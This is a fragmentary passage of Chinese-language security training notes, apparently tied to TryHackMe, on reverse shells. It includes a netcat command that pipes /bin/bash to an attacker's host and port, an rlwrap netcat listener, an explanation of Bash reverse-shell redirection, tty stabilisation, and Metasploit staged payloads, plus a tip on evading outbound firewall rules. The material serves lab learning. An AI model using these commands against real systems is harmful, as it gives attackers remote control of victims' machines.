...
* `-p`：表示端口规格随后给出
<WarningText>Tips：</WarningText>使用小于 1024 的端口时，需要用`sudo`，使用常用端口更可能绕过防火墙的出站规则


```Bash
nc <target-ip> <port> -e <WarningText>/bin/bash   </WarningText> #将目标连接攻击机
```
...
<WarningText>rlwrap nc -lvnp</WarningText><span style={{"color": "#C7D5F6"}}><port></span>   #可以拥有一个功能更完整的shell
...
> 使用初始的 nc shell 作为进入功能更完备的`nc shell`的跳板。<WarningText>仅限于 Linux 系统</WarningText>，Windows 系统中的 socat shell 稳定性没有更好
...
<InfoText>Bash 产生了一个交互环境和一个本地主机主动发起的与攻击机 2333 端口建立的连接（即 TCP 2333 会话连接）相结合，然后在重定向个 TCP 2333 会话连接，最后将用户键盘输入与标准输出相结合再次重定向给一个标准的输出，即得到一个 Bash 反弹环境。</InfoText>
...
#### 4.<WarningText>建立完全稳定的 Linux tty 反向 shell（√）</WarningText>
...
![](https://raw.githubusercontent.com/yy0691/img-bed/main/Net_Safe_FeiShu/YD2fb5wAboQN7DxXQ58c2EWsn7c.png)
...
![](https://raw.githubusercontent.com/yy0691/img-bed/main/Net_Safe_FeiShu/JbeMb6BPyoFytGx7gbXcFZ3Onph.png)
...
![](https://raw.githubusercontent.com/yy0691/img-bed/main/Net_Safe_FeiShu/Y4iabVJ3doBH57xpXSiccffSnpg.png)
...
![](https://raw.githubusercontent.com/yy0691/img-bed/main/Net_Safe_FeiShu/ZLzIb7oHUonzlKxWNaPccioOnsg.png)
...
![](https://raw.githubusercontent.com/yy0691/img-bed/main/Net_Safe_FeiShu/SBSlbsHAyoc3H7xvjuLc4X5Pnsd.png)

当运行前一个任务中生成的暂存有效载荷时，Metasploit会接收到连接，发送剩余的有效载荷并给我们一个反向shell:

![](https://raw.githubusercontent.com/yy0691/img-bed/main/Net_Safe_FeiShu/WP4mb6lHnoeDfixKSDKcVE8inme.png)
...
<InfoText>参阅</InfoText><InfoText>[TryHackMe | Cyber Security Training](https://tryhackme.com/room/uploadvulns)</InfoText><InfoText>详细了解此概念。</InfoText>
...
![](https://raw.githubusercontent.com/yy0691/img-bed/main/Net_Safe_FeiShu/AkuUbkbnnoJNtcxTvxXc92NUnSh.png)
